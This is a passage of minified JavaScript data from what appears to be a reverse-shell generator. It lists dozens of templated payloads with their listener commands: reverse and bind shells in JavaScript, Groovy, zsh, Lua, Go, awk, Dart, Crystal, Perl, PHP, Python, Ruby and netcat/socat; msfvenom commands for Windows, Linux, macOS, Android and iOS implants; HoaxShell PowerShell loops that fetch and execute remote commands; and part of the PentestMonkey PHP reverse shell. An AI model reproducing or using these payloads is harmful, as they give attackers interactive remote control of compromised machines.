        out.println("port opened on " + socket);\r
     } catch( Exception e ) {}\r
%>\r
</pre>\r
</body>\r
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-javascript",name:"Javascript",category:"Reverse",language:"NodeJS",platform:"Both",command:`String command = "var host = '{ip}';" +\r
                       "var port = {port};" +\r
                       "var cmd = '{shell}';"+\r
                       "var s = new java.net.Socket(host, port);" +\r
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+\r
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+\r
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+\r
                       "print ('Connected');"+\r
                       "while (!s.isClosed()) {"+\r
                       "    while (pi.available() > 0)"+\r
                       "        so.write(pi.read());"+\r
                       "    while (pe.available() > 0)"+\r
                       "        so.write(pe.read());"+\r
                       "    while (si.available() > 0)"+\r
                       "        po.write(si.read());"+\r
                       "    so.flush();"+\r
                       "    po.flush();"+\r
                       "    java.lang.Thread.sleep(50);"+\r
                       "    try {"+\r
                       "        p.exitValue();"+\r
                       "        break;"+\r
                       "    }"+\r
                       "    catch (e) {"+\r
                       "    }"+\r
                       "}"+\r
                       "p.destroy();"+\r
                       "s.close();";\r
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";\r
ref.add(new StringRefAddr("x", x);`,listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!0},{id:"rev-groovy",name:"Groovy",category:"Reverse",language:"Groovy",platform:"Windows",command:'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();',listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-telnet",name:"telnet",category:"Reverse",language:"cURL / Telnet",platform:"Linux",command:"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-zsh",name:"zsh",category:"Reverse",language:"Zsh",platform:"Linux",command:"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-lua-1",name:"Lua #1",category:"Reverse",language:"Lua",platform:"Linux",command:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');"`,listener:"nc -lvnp {port}",notes:"",extension:".lua",isFullScript:!1},{id:"rev-lua-2",name:"Lua #2",category:"Reverse",language:"Lua",platform:"Both",command:`lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,listener:"nc -lvnp {port}",notes:"",extension:".lua",isFullScript:!1},{id:"rev-golang",name:"Golang",category:"Reverse",language:"Golang",platform:"Both",command:`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,listener:"nc -lvnp {port}",notes:"",extension:".go",isFullScript:!1},{id:"rev-vlang",name:"Vlang",category:"Reverse",language:"Vlang",platform:"Linux",command:`echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e {shell} {ip} {port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-awk",name:"Awk",category:"Reverse",language:"Awk",platform:"Linux",command:`awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-dart",name:"Dart",category:"Reverse",language:"Dart",platform:"Both",command:`import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("{ip}", {port}).then((socket) {
    socket.listen((data) {
      Process.start('{shell}', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-crystal-system",name:"Crystal (system)",category:"Reverse",language:"Crystal",platform:"Both",command:`crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-crystal-code",name:"Crystal (code)",category:"Reverse",language:"Crystal",platform:"Linux",command:`require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("{ip}", {port})
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"bind-nc-e-bind",name:"nc -e Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"nc -nlvp {port} -e /bin/sh",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-nc-exe-e-bind",name:"nc.exe -e Bind",category:"Bind",language:"Netcat",platform:"Windows",command:"nc.exe -nlvp {port} -e cmd",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-nc-mkfifo-bind",name:"nc mkfifo Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-ncat-e-bind",name:"ncat -e Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"ncat -nlvp {port} -e /bin/sh",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-perl-bind",name:"Perl Bind",category:"Bind",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".pl",isFullScript:!1},{id:"bind-php-bind",name:"PHP Bind",category:"Bind",language:"PHP",platform:"Both",command:`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".php",isFullScript:!1},{id:"bind-python3-bind",name:"Python3 Bind",category:"Bind",language:"Python",platform:"Both",command:`python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".py",isFullScript:!1},{id:"bind-ruby-bind",name:"Ruby Bind",category:"Bind",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e 'f=TCPServer.new(9001); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec "/bin/sh -i"'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".rb",isFullScript:!1},{id:"bind-socat-tty-bind",name:"Socat (TTY) Bind",category:"Bind",language:"Socat",platform:"Linux",command:"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"msf-windows-meterpreter-staged-reverse-tcp-x64",name:"Windows Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-meterpreter-stageless-reverse-tcp-x64",name:"Windows Meterpreter Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-reverse-tcp-x64",name:"Windows Staged Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-stageless-reverse-tcp-x64",name:"Windows Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-jsp-reverse-tcp",name:"Windows Staged JSP Reverse TCP",category:"MSFVenom",language:"Java",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-aspx-reverse-tcp",name:"Windows Staged ASPX Reverse TCP",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-aspx-reverse-tcp-x64",name:"Windows Staged ASPX Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-linux-meterpreter-staged-reverse-tcp-x64",name:"Linux Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"Linux",platform:"Linux",command:"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-linux-stageless-reverse-tcp-x64",name:"Linux Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Linux",platform:"Linux",command:"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-bind-tcp-shellcode-bof",name:"Windows Bind TCP ShellCode - BOF",category:"MSFVenom",language:"Windows",platform:"Both",command:"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\0' -f python -v notBuf -o shellcode",listener:"nc -nv {ip} {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-meterpreter-staged-reverse-tcp-x64",name:"macOS Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-meterpreter-stageless-reverse-tcp-x64",name:"macOS Meterpreter Stageless Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-stageless-reverse-tcp-x64",name:"macOS Stageless Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-php-meterpreter-stageless-reverse-tcp",name:"PHP Meterpreter Stageless Reverse TCP",category:"MSFVenom",language:"PHP",platform:"Both",command:"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-php-reverse-php",name:"PHP Reverse PHP",category:"MSFVenom",language:"PHP",platform:"Both",command:"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-jsp-stageless-reverse-tcp",name:"JSP Stageless Reverse TCP",category:"MSFVenom",language:"Java",platform:"Both",command:"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-war-stageless-reverse-tcp",name:"WAR Stageless Reverse TCP",category:"MSFVenom",language:"Java",platform:"Both",command:"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-android-meterpreter-reverse-tcp",name:"Android Meterpreter Reverse TCP",category:"MSFVenom",language:"Android",platform:"Both",command:"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-android-meterpreter-embed-reverse-tcp",name:"Android Meterpreter Embed Reverse TCP",category:"MSFVenom",language:"Android",platform:"Both",command:"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-apple-ios-meterpreter-reverse-tcp-inline",name:"Apple iOS Meterpreter Reverse TCP Inline",category:"MSFVenom",language:"Apple iOS",platform:"Both",command:"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-python-stageless-reverse-tcp",name:"Python Stageless Reverse TCP",category:"MSFVenom",language:"Python",platform:"Both",command:"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-bash-stageless-reverse-tcp",name:"Bash Stageless Reverse TCP",category:"MSFVenom",language:"Bash",platform:"Linux",command:"msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"hoax-windows-cmd-curl",name:"Windows CMD cURL",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL',listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex",name:"PowerShell IEX",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex-constr-lang-mode",name:"PowerShell IEX Constr Lang Mode",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile",name:"PowerShell Outfile",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-constr-lang-mode",name:"PowerShell Outfile Constr Lang Mode",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-windows-cmd-curl-https",name:"Windows CMD cURL https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL',listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex-https",name:"PowerShell IEX https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-constr-lang-mode-iex-https",name:"PowerShell Constr Lang Mode IEX https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-https",name:"PowerShell Outfile https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-constr-lang-mode-https",name:"PowerShell Outfile Constr Lang Mode https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"pm-pentestmonkey-php-reverse-shell-full-file",name:"PentestMonkey PHP Reverse Shell (Full File)",category:"PentestMonkey",language:"PHP",platform:"Both",command:`<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {shell} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) { exit(1); }
	if ($pid) { exit(0); }
	if (posix_setsid() == -1) { exit(1); }
	$daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
	if (feof($sock) || feof($pipes[1])) { break; }
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		$input = fread($sock, $chunk_size);
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		$input = fread($pipes[1], $chunk_size);
		fwrite($sock, $input);
	}
